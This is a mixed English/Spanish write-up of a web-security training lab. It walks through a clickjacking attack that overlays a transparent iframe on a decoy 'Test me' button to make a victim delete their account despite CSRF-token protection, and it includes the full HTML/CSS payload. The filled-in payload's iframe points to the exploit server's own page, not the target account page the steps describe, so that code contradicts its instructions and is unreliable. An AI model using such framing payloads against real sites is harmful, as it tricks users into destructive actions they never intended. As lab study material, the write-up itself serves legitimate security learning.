# Lab: Basic clickjacking with CSRF token protection

## Descripción: 
This lab contains login functionality and a delete account button that is protected by a CSRF token. A user will click on elements that display the word "click" on a decoy website.

To solve the lab, craft some HTML that frames the account page and fools the user into deleting their account. The lab is solved when the account is deleted.

You can log in to your own account using the following credentials: `wiener:peter`

#### Note:
The victim will be using Chrome so test your exploit on that browser.

## Solución:
1. Iniciamos sesión con la cuenta en el sitio web de destino.

![Pasted image 20230628145430](Pasted%20image%2020230628145430.png)

2. Vamos al servidor de explotación y pegamos la siguiente plantilla HTML en la sección Cuerpo:

```html
<style> 
	iframe { 
		position:relative; 
		width:$width_value; 
		height: $height_value; 
		opacity: $opacity; 
		z-index: 2; 
	} 
	
	div { 
		position:absolute; 
		top:$top_value; 
		left:$side_value; 
		z-index: 1; 
	} 
</style> 

<div>Test me</div> <iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
```

3. Realizamos los siguientes ajustes en la plantilla:
	- Reemplazamos `YOUR-LAB-ID` en el atributo iframe `src` con su ID de laboratorio único.
	- Sustituya los valores de píxel adecuados por las variables `$height_value` y `$width_value` del iframe (sugerimos 1200px y 900px respectivamente).
	- Sustituya los valores de píxel adecuados por las variables` $top_value` y `$side_value` del contenido web señuelo para que el botón "Eliminar cuenta" y la acción señuelo "Pruébeme" se alineen (sugerimos 570px y 60px respectivamente).
	- Establezca el valor de opacidad `$opacity` para garantizar que el iframe de destino sea transparente. Inicialmente, use una opacidad de 0.1 para que pueda alinear las acciones de iframe y ajustar los valores de posición según sea necesario. Para el ataque enviado, funcionará un valor de 0.0001.

```html
<style> 
	iframe { 
		position:relative; 
		width:1200px; 
		height: 900px; 
		opacity: 0.0001; 
		z-index: 2; 
	} 
	
	div { 
		position:absolute; 
		top:570px; 
		left:60px; 
		z-index: 1; 
	} 
</style> 

<div>Test me</div> <iframe src="https://exploit-0a6d005e044a51eb8042076301a400fd.exploit-server.net/exploit"></iframe>
```

![Pasted image 20230628145800](Pasted%20image%2020230628145800.png)

4. Haga clic en **Store** y luego en **View exploit**.

5. Pase el cursor sobre **Test Me** y asegúrese de que el cursor cambie a una mano que indica que el elemento div está colocado correctamente. No haga clic en el botón **"Delete account"** usted mismo. Si lo hace, el laboratorio se romperá y deberá esperar hasta que se reinicie para volver a intentarlo (alrededor de 20 minutos). Si el div no se alinea correctamente, ajuste las propiedades `top` e `left` de la hoja de estilo.

6. Una vez que tenga el elemento div alineado correctamente, cambie "Test me" a "Haga clic en mí" y haga clic en **Store**.

7. Haga clic en **Deliver exploit to victim** y el laboratorio debería resolverse.

## Notas adicionales:

## clickjacking: 
El **clickjacking** es un ataque basado en la interfaz en el que se engaña a un usuario para que haga clic en contenido procesable en un sitio web oculto al hacer clic en otro contenido en un sitio web señuelo. Considere el siguiente ejemplo:

Un usuario de la web accede a un sitio web señuelo (quizás este es un enlace proporcionado por un correo electrónico) y hace clic en un botón para ganar un premio. Sin saberlo, un atacante los engañó para que presionaran un botón oculto alternativo y esto resultó en el pago de una cuenta en otro sitio. Este es un ejemplo de un ataque de clickjacking. La técnica depende de la incorporación de una página web invisible y procesable (o varias páginas) que contenga un botón o enlace oculto, por ejemplo, dentro de un iframe. El iframe se superpone sobre el contenido de la página web de señuelo anticipado del usuario. Este ataque se diferencia de un ataque CSRF en que se requiere que el usuario realice una acción, como hacer clic en un botón, mientras que un ataque CSRF depende de la falsificación de una solicitud completa sin el conocimiento o la entrada del usuario.

## Referencias:
- https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/clickjacking.md
- https://portswigger.net/web-security/csrf
- https://portswigger.net/web-security/clickjacking